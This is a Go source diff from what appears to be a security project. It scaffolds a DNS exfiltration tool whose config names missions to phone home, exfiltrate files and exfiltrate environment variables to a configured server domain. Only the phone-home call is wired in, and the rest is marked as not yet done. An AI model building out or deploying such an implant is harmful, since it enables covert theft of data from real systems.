@@ -2,27 +2,43 @@ package main
 
 import (
 	_ "embed"
-	"fmt"
-	"github.com/go-ini/ini"
+	"github.com/sam-bee/security-itsalwaysdns/pkg/dnsexfiltool"
+	"github.com/pelletier/go-toml"
 )
 
-//go:embed config.ini
-var iniContents string
+//go:embed config.toml
+var configContents string
+
+type ApplicationConfig struct {
+	Missions struct {
+		PhoneHome    bool
+		ExfilFiles   bool
+		ExfilEnvVars bool
+	}
+	Objectives struct {
+		FilesAndFolders []string
+	}
+	ExfilServer struct {
+		MainDomain string
+		PortNo     int
+	}
+}
+
+var config = ApplicationConfig{}
 
 func main() {
 	parseConfig()
+
+	if config.Missions.PhoneHome {
+		dnsexfiltool.PhoneHome(config .ExfilServer.MainDomain)
+	}
+
+	// @todo doesn't do anything else yet
 }
 
 func parseConfig() {
-	// parse ini string
-	cfg, err := ini.Load([]byte(iniContents))
+	err := toml.Unmarshal([]byte(configContents), &config)
 	if err != nil {
-		fmt.Printf("Failed to parse ini file: %v", err)
-		return
+		panic(err)
 	}
-
-	// Access the values from the ini file
-	section := cfg.Section("det")
-	value := section.Key("SETTING").String()
-	fmt.Println(value)
 }
